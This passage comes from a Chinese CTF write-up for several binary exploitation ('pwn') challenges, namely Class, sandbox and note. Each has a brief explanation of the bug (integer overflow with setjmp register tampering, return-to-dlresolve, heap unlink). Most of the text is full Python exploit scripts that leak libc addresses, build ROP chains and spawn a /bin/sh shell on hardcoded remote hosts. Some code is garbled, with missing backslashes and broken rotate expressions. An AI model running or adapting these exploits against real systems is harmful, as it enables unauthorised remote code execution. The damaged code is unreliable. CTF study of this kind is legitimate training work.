     edit(3, p64(strlen_got)) #note2
       show(2)
     r.recvuntil('content: ')
     strlen_addr = u64(r.readline()[:-1].ljust(8, 'x00'))
       print "[*] strlen addr:{0}".format(hex(strlen_addr))
     libc = ELF("./libc-2.19.so")#ELF("/lib/x86_64-linux-gnu/libc.so.6")
       libc_base = strlen_addr - libc.symbols['strlen']
     system_addr = libc_base + libc.symbols['system'] 
     edit(2, p64(system_addr))
     edit(0, '/bin/shx00')
     r.interactive()
**  
**
**Pwn-Class**
在init函数中num*200+8存在整形溢出，num控制得当可以使得分配的空间很小。Setjmp会将当前的寄存器保存到堆上（部分寄存器进行了rol和异或加密）。通过show功能可以泄露出保存的寄存器值，通过edit功能可以修改这些值，然后通过longjmp改变程序的控制流程，因为rsp和rip都能被随意修改，所以比较容易进行rop。
脚本：
    from threading import Thread
    from zio import *
    target = './class'
    target = ('58.213.63.30', 4001)
    def interact(io):
        def run_recv():
            while True:
                try:
                    output = io.read_until_timeout(timeout=1)
                    # print output
                except:
                    return
        t1 = Thread(target=run_recv)
        t1.start()
        while True:
            d = raw_input()
            if d != '':
                io.writeline(d)
    def rerol(d):
        return ((d>0x11))&0xffffffffffffffff
    def rol(d):
        return ((d>(64-0x11)))&0xffffffffffffffff
    def show(io, id):
        io.read_until('>>')
        io.writeline('2')
        io.read_until(':')
        io.writeline(str(id))
        io.read_until('name:')
        r12 = l64(io.read_until(',')[:-1].ljust(8, 'x00'))
        print 'r12', hex(r12)
        io.read_until('addr:')
        enc_rsp = l64(io.read(8))
        enc_rip = l64(io.read_until(',')[:-1].ljust(8, 'x00'))
        base = r12 - 0xaa0
        print 'enc_rsp', hex(enc_rsp)
        print 'enc_rip', hex(enc_rip)
        real_rip = base + 0x1495
        cookie = rerol(enc_rip)^real_rip
        print 'cookie', hex(cookie)
        real_rsp = rerol(enc_rsp)^cookie
        print 'real_rsp', hex(real_rsp)
        return (base, real_rsp, cookie)
    def edit(io, id, age, name, addr, introduce):
        io.read_until('>>')
        io.writeline('3')
        io.read_until(':')
        io.writeline(str(id))
        io.read_until(':')
        io.writeline(name)
        io.read_until(':')
        io.writeline(str(age))
        io.read_until(':')
        io.writeline(addr)
        io.read_until(':')
        io.writeline(introduce)
    def exp(target):
        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
                 print_write=COLORED(RAW, 'green'))
        io.read_until(':')
        io.writeline(str(92233720368547759))
        base, rsp, cookie = show(io, 1)
        print 'base', hex(base)
        fake_rsp = rsp - 0x48
        pop_rdi_ret = base + 0x000000000001523
        addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))
        print HEX(addr)
        edit(io, 1, 0, "", addr, "")
        io.read_until('>>')
        payload = '5;'+'a'*6
        puts_got = 0x0000000000202018+ base
        puts_plt = 0x9a0 + base
        main = base + 0x00000000000013ff
        payload += l64(puts_got)+l64(puts_plt)+l64(main)
        io.writeline(payload)
        puts_addr = l64(io.readline()[:-1].ljust(8, 'x00'))
        '''
        base = puts_addr - 0x000000000006F5D0
        system = base + 0x0000000000045380
        print 'system', hex(system)
        binsh = base + 0x000000000018C58B
        '''
        base = puts_addr - 0x000000000006FD60
        print 'base', hex(base)
        system = base + 0x0000000000046590
        binsh = base + 0x000000000017C8C3
        #io.gdb_hint()
        io.read_until(':')
        io.writeline(str(92233720368547759))
        fake_rsp = rsp - 0x80
        addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))
        print HEX(addr)
        io.gdb_hint()
        edit(io, 1, 0, "", addr, "")
        io.read_until('>>')
        payload = '5;'+'a'*6
        payload += l64(binsh)+l64(system)+l64(main)
        io.writeline(payload)
        #io.gdb_hint()
        interact(io)
    exp(target)
**  
**
**Pwn-sandbox**
沙箱做了如下限制：对外的调用都通过jmp ds:dl_resolve出去，所以采用return-to-dlresolve进行利用。
脚本：
    #encoding:utf-8
    import struct
    from threading import Thread
    from zio import *
    target = './sandbox ./vul'
    #target = './vul'
    target = ('58.213.63.30', 4004)
    def interact(io):
        def run_recv():
            while True:
                try:
                    output = io.read_until_timeout(timeout=1)
                    # print output
                except:
                    return
        t1 = Thread(target=run_recv)
        t1.start()
        while True:
            d = raw_input()
            if d != '':
                io.writeline(d)
    def write_16byte(io, addr, value):
        io.write('a'*0x10+l64(addr+0x10)+l64(0x400582))
        io.write(value+l64(0x601f00)+l64(0x400582))
    fake_relro = ''
    fake_sym = ''
    #link_map_addr = 0x00007ffff7ffe1c8 #close aslr.(if has aslr, need leak)
    #link_map_addr = 0x7ffff7ffe168
    def generate_fake_relro(r_offset, r_sym):
        return l64(r_offset) + l32(7)+l32(r_sym)+ l64(0)
    def generate_fake_sym(st_name):
        return l32(st_name)+l8(0x12)+l8(0) + l16(0) + l64(0) + l64(0)
    #versym = 0x40031e
    symtab = 0x4002b8
    strtab = 0x400330
    jmprel = 0x4003b8
    bss_addr = 0x601058
    # .bss addr = 0x601058
    # 0x155dc*0x18+0x4003b8 = 0x601058
    # so index = 0x155dc
    #0x155e8*0x18+0x4002b8 = 0x601078
    # so r_sym = 0x155e8
    # 0x200d68 + 0x400330 = 0x601098
    # so st_name = 0x200d68
    def write_any(io, addr, value):
        print hex(addr), hex(value)
        io.read_until(':n')
        io.writeline('0')
        io.write(l64(addr)+l64(value))
    def exp(target):
        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
        pop_rdi_ret = 0x0000000000400603
        pop_rsi_r15_ret = 0x0000000000400601
        leak_addr = 0x600ef0
        write_plt = 0x0000000000400430
        pop_rbp_ret = 0x4004d0
        leak_rop = l64(pop_rsi_r15_ret) + l64(leak_addr) + l64(0) + l64(pop_rdi_ret) + l64(1) + l64(write_plt)
        leak_rop += l64(pop_rbp_ret) + l64(0x601f00) + l64(0x400582)
        for i in range(0, len(leak_rop), 8):
            write_16byte(io, 0x601b00+i, leak_rop[i:i+8]+'x00'*8)
        leave_ret = 0x40059d
        leak_stack_povit = 'a' * 0x10 + l64(0x601b00 - 0x8) + l64(leave_ret)
        io.write(leak_stack_povit)
        io.read_until(':')
        link_map_addr = l64(io.read(8)) + 0x28
        print hex(link_map_addr)
        r_offset = 0x601970 # a writable addr
        r_sym = 0x155e8
        fake_relro = generate_fake_relro(r_offset, r_sym).ljust(0x20, 'x00')
        st_name = 0x200d68
        fake_sym = generate_fake_sym(st_name).ljust(0x20, 'x00')
        write_16byte(io, link_map_addr+0x1c8, 'x00'*0x10)
        #write_16byte(io, 0x600858, l64(0x6ffffff0)+l64(0x3d57d6))
        for i in range(0, len(fake_relro), 8):
            write_16byte(io, 0x601058+i, fake_relro[i:i+8]+'x00'*8)
        for i in range(0, len(fake_sym), 8):
            write_16byte(io, 0x601078+i, fake_sym[i:i+8]+'x00'*8)
        write_16byte(io, 0x601098, 'system'.ljust(16, 'x00'))
        write_16byte(io, 0x601a50, '/bin/sh'.ljust(16, 'x00'))
        plt0 = 0x400420
        rop = l64(pop_rdi_ret) + l64(0x601a50)
        index = 0x155dc
        rop += l64(plt0) + l64(index)
        for i in range(0, len(rop), 8):
            write_16byte(io, 0x601980+i, rop[i:i+8]+'x00'*8)
        stack_povit = 'a'*0x10 + l64(0x601980-0x8) + l64(leave_ret)
        io.write(stack_povit)
        interact(io)
    exp(target)
**  
**
**Pwn-note**
漏洞存在于edit中，有堆溢出。
此题采用talloc，不过talloc_free内部会调用free函数，所以采用unlink方法进行利用。
脚本：
    from threading import Thread
    from zio import *
    target = ('119.254.101.197', 10000)
    target = './note'
    def interact(io):
        def run_recv():